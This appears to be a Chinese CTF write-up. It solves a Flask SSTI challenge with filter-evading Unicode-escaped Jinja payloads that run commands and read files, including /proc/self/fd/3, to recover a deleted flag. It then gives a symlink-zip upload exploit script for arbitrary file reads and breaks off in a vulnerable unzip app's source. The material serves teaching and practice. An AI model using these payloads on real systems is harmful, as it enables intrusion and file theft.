<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(line, key, key2):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(x <span style="color:#f92672">^</span> ord(line[x]) <span style="color:#f92672">^</span> ord(key[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][x]) <span style="color:#f92672">^</span> ord(key2[x])) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(len(line)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;flag&#39;</span>] <span style="color:#f92672">=</span> encode(<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#39;</span>, <span style="color:#e6db74">&#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#39;</span>)
</span></span></code></pre></div><p>进入题目，是一个输入框，输入你的名字然后输出：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042244641.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042244641.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042244641.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042244641.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042244641.png"
        title="img" /></p>
<p>经测试存在SSTI漏洞：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042244020.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042244020.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042244020.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042244020.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042244020.png"
        title="img" /></p>
<p>经测试，过滤了一下字符。</p>
<p>话不多少，直接使用Unicode编码绕过，给出payload：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()[<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f</span><span style="color:#e6db74">&#34;</span>][<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f</span><span style="color:#e6db74">&#34;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f</span><span style="color:#e6db74">&#34;</span>]()[<span style="color:#ae81ff">80</span>][<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u006c\u006f\u0061\u0064\u005f\u006d\u006f\u0064\u0075\u006c\u0065</span><span style="color:#e6db74">&#34;</span>](<span style="color:#e6db74">&#34;os&#34;</span>)[<span style="color:#e6db74">&#34;popen&#34;</span>](<span style="color:#e6db74">&#34;ls /&#34;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#34;read&#34;</span>)()}}
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 用&lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;这个去执行命令</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{{()[&#34;__class__&#34;][&#34;__bases__&#34;][0][&#34;__subclasses__&#34;]()[80][&#34;load_module&#34;](&#34;os&#34;)[&#34;system&#34;](&#34;ls&#34;)}}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># 用&lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;这个去执行命令
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span></code></pre></div><p>命令执行成功：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://p4.ssl.qhimg.com/t01e7dd570dfbf3c748.png"
        data-srcset="https://p4.ssl.qhimg.com/t01e7dd570dfbf3c748.png, https://p4.ssl.qhimg.com/t01e7dd570dfbf3c748.png 1.5x, https://p4.ssl.qhimg.com/t01e7dd570dfbf3c748.png 2x"
        data-sizes="auto"
        alt="https://p4.ssl.qhimg.com/t01e7dd570dfbf3c748.png"
        title="img" /></p>
<p>通过读取/proc目录中的文件查看当前进程：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()[<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f</span><span style="color:#e6db74">&#34;</span>][<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f</span><span style="color:#e6db74">&#34;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f</span><span style="color:#e6db74">&#34;</span>]()[<span style="color:#ae81ff">91</span>][<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061</span><span style="color:#e6db74">&#34;</span>](<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;app.py&#34;</span>)}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{{()[&#34;__class__&#34;][&#34;__bases__&#34;][0][&#34;__subclasses__&#34;]()[91][&#34;get_data&#34;](0, &#34;app.py&#34;)}}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># 用&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;这个去读取文件
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span></code></pre></div><p>**注意：**这里就不能使用之前那个命令执行通过cat命令读取cmdline了，因为如果是cat读取/proc/self/cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用python读取文件的方式读取/proc/self/cmdline。（不知道你们听懂了没……）</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://p3.ssl.qhimg.com/t014fad9c39826b95ab.png"
        data-srcset="https://p3.ssl.qhimg.com/t014fad9c39826b95ab.png, https://p3.ssl.qhimg.com/t014fad9c39826b95ab.png 1.5x, https://p3.ssl.qhimg.com/t014fad9c39826b95ab.png 2x"
        data-sizes="auto"
        alt="https://p3.ssl.qhimg.com/t014fad9c39826b95ab.png"
        title="img" /></p>
<p>如上图所示，得到当前进程为app.py。</p>
<p>读取app.py文件：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://p2.ssl.qhimg.com/t01723062bd0e569e7c.png"
        data-srcset="https://p2.ssl.qhimg.com/t01723062bd0e569e7c.png, https://p2.ssl.qhimg.com/t01723062bd0e569e7c.png 1.5x, https://p2.ssl.qhimg.com/t01723062bd0e569e7c.png 2x"
        data-sizes="auto"
        alt="https://p2.ssl.qhimg.com/t01723062bd0e569e7c.png"
        title="img" /></p>
<p>得到了如下源码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template_string, render_template, request
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;folow @osminogka.ann on instagram =)&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Tiaonmmn don&#39;t remember to remove this part on deploy so nobody will solve that hehe</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def encode(line, key, key2):
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    return &#39;&#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">app.config[&#39;flag&#39;] = encode(&#39;&#39;, &#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;, &#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(line, key, key2):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(x <span style="color:#f92672">^</span> ord(line[x]) <span style="color:#f92672">^</span> ord(key[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][x]) <span style="color:#f92672">^</span> ord(key2[x])) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(len(line)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/app/flag&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;flag&#39;</span>] <span style="color:#f92672">=</span> encode(flag, <span style="color:#e6db74">&#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;</span>, <span style="color:#e6db74">&#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;</span>)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#34;/app/flag&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nicknames <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;˜”*°★☆★_</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">_★☆★°°*&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> ~♡ⓛⓞⓥⓔ♡~&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> Вêчңø в øĤлâйĤé&#39;</span>, <span style="color:#e6db74">&#39;♪ ♪ ♪ </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> ♪ ♪ ♪ &#39;</span>, <span style="color:#e6db74">&#39;[♥♥♥</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">♥♥♥]&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, kOтO®Aя )(оТеЛ@ ©4@$tьЯ&#39;</span>, <span style="color:#e6db74">&#39;♔</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">♔&#39;</span>, <span style="color:#e6db74">&#39;[♂+♂=♥]</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">[♂+♂=♥]&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            p <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>values<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;nickname&#39;</span>)
</span></span><span style="display:flex;"><span>            id <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, len(nicknames) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> p <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">in</span> p <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;_&#39;</span> <span style="color:#f92672">in</span> p <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> p:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Your nickname contains restricted characters!&#39;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> render_template_string(nicknames[id] <span style="color:#f92672">%</span> p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            print(e)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Exception&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span>)
</span></span></code></pre></div><p>经过阅读源码我们，app.py会打开/app/flag文件，然后读取其中的内容进行加密，加密函数在提示中给出的源码中。最后会删掉flag。话不多少，直接读取/proc/self/fd/3，得到Flag：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()[<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f</span><span style="color:#e6db74">&#34;</span>][<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f</span><span style="color:#e6db74">&#34;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f</span><span style="color:#e6db74">&#34;</span>]()[<span style="color:#ae81ff">91</span>][<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061</span><span style="color:#e6db74">&#34;</span>](<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;/proc/self/fd/3&#34;</span>)}}
</span></span></code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://p0.ssl.qhimg.com/t01361216102591094b.png"
        data-srcset="https://p0.ssl.qhimg.com/t01361216102591094b.png, https://p0.ssl.qhimg.com/t01361216102591094b.png 1.5x, https://p0.ssl.qhimg.com/t01361216102591094b.png 2x"
        data-sizes="auto"
        alt="https://p0.ssl.qhimg.com/t01361216102591094b.png"
        title="img" /></p>
<h2 id="小结">小结</h2>
<p>这里得补一下Linux中/proc目录的一些基础知识,找了两篇文章：</p>
<p><a href="https://www.cnblogs.com/DswCnblog/p/5780389.html" target="_blank" rel="noopener noreffer">https://www.cnblogs.com/DswCnblog/p/5780389.html</a>
</p>
<p><a href="https://www.anquanke.com/post/id/241148" target="_blank" rel="noopener noreffer">https://www.anquanke.com/post/id/241148</a>
</p>
<p>这里列一些常见的命令</p>
<pre tabindex="0"><code>cmdline — 启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息； 
cwd — 指向当前进程运行目录的一个符号链接； 
environ — 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示； 
fd — 这是个目录，包含当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接； 
maps — 当前进程关联到的每个可执行文件和库文件在内存中的映射区域及其访问权限所组成的列表； 
mem — 当前进程所占用的内存空间，由open、read和lseek等系统调用使用，不能被用户读取； 
exe — 指向启动当前进程的可执行文件（完整路径）的符号链接，通过/proc/N/exe可以启动当前进程的一个拷贝； 
/proc/self表示当前进程目录。
/proc/self/cmd指向当前目录
</code></pre><p>综上，删除的东西不是在当前进程就是在某个进程中，总能够找到。如果没有限制线程的话，爆破也能找到。</p>
<p>一般的出题思路大概会是这样</p>
<pre tabindex="0"><code>如果getshell，可以用ps等命令列出进程(ps aux,我实验的docker环境没有装)，也可以一个一个找。最省力的办法是cat /proc/*/fd/*

如果只能文件读取，那么就在当前进程找就行，用bp爆破也能找到
</code></pre><h2 id="软链接">软链接</h2>
<p>软链接这个考点不一定只是python里面会出现，其他语言也有可能会考，这里讲一下python里出现的。一般是配合zip文件上传</p>
<p>值得一提的是</p>
<pre tabindex="0"><code>使用tar打包压缩可以保留原文件中的软链接。
zip使用参数-y，可以保留原文件中的软链接。
</code></pre><p>例题参考：BUUCTF [HCTF 2018] Hide and seek         [SWPUCTF2019]Easy Python</p>
<p>直接贴制作软链接的exp(以后改改拿来用)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_zip</span>():
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;ln -s &#39;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; test_exp&#39;</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;zip -y test_exp.zip test_exp&#39;</span>)  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>():
</span></span><span style="display:flex;"><span>    make_zip()
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], files<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;the_file&#39;</span>: open(<span style="color:#e6db74">&#39;./test_exp.zip&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)})
</span></span><span style="display:flex;"><span>    print(res<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;rm -rf test_exp&#39;</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;rm -rf test_exp.zip&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    run()
</span></span></code></pre></div><p>运行命令实现文件读取</p>
<pre tabindex="0"><code>python38 ln_exp.py http://dda6fb28-b2f4-4cbb-8a41-14dcfac2d826.node3.buuoj.cn/upload /app/uwsgi.ini
</code></pre><h3 id="2022美团杯-onlineunzip禁用">2022美团杯-OnlineUnzip(禁用..)</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> md5
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, redirect, request, render_template, url_for, make_response
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">=</span>Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extractFile</span>(filepath):
</span></span><span style="display:flex;"><span>    extractdir<span style="color:#f92672">=</span>filepath<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(extractdir):
</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>makedirs(extractdir)
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;unzip -o </span><span style="color:#e6db74">{</span>filepath<span style="color:#e6db74">}</span><span style="color:#e6db74"> -d </span><span style="color:#e6db74">{</span>extractdir<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;display&#39;</span>,extractdir<span style="color:#f92672">=</span>extractdir))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/display&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/display/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/display/&lt;path:extractdir&gt;&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">display</span>(extractdir<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\.\.&#34;</span>, extractdir, re<span style="color:#f92672">.</span>M <span style="color:#f92672">|</span> re<span style="color:#f92672">.</span>I) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Hacker?&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(extractdir):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(extractdir):
</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> open(extractdir, <span style="color:#e6db74">&#39;rb&#39;</span>)
</span></span><span style="display:flex;"><span>                response <span style="color:#f92672">=</span> make_response(f<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span>                response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Content-Type&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;application/octet-stream&#39;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                fn <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(extractdir)
</span></span><span style="display:flex;"><span>                fn <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;..&#34;</span>] <span style="color:#f92672">+</span> fn
</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;templates/template.html&#34;</span>)
</span></span><span style="display:flex;"><span>                x <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>                f<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>                ret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;h1&gt;文件列表:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&#34;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> fn:
</span></span><span style="display:flex;"><span>                    tpath <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/display&#39;</span>, extractdir, i)
</span></span><span style="display:flex;"><span>                    ret <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;a href=&#39;&#34;</span> <span style="color:#f92672">+</span> tpath <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&gt;&#34;</span> <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/a&gt;&lt;br&gt;&#34;</span>
</span></span><span style="display:flex;"><span>                x <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;HTMLTEXT&#34;</span>, ret)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/upload&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload</span>():
</span></span><span style="display:flex;"><span>    ip <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>remote_addr
</span></span><span style="display:flex;"><span>    uploadpath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uploads/&#39;</span> <span style="color:#f92672">+</span> md5(ip<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>
